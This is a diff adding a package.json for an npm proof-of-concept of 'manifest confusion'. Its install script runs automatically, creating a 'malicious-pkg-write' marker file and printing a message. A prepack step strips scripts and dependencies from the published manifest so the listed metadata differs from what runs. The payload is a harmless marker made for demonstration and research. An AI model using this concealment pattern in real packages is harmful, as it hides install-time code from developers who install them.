@@ -1,0 +1,33 @@
+{
+  "name": "manifest_confusion_poc",
+  "version": "1.0.0",
+  "description": "A simple npm package for demonstrating manifest confusion",
+  "main": "index.js",
+  "scripts": {
+    "install": "touch ./malicious-pkg-write && echo \"malicious pkg exec!\"\n",
+    "prepack": "clean-package --remove scripts overrides devDependencies dependencies license",
+    "pack": "npm pack",
+    "postpack": "clean-package restore",
+    "publish_package": "npm publish --tag latest --access=public"
+  },
+  "repository": {
+    "type": "",
+    "url": ""
+  },
+  "author": "yoda",
+  "license": "ISC",
+  "dependencies": {
+    "express": "^4.17.1"
+  },
+  "devDependencies": {
+    "rimraf": "^3.0.2",
+    "typescript": "^4.6.3"
+  },
+  "homepage": "",
+  "keywords": [
+    "poc"
+  ],
+  "files": [
+    "index.js"
+  ]
+}
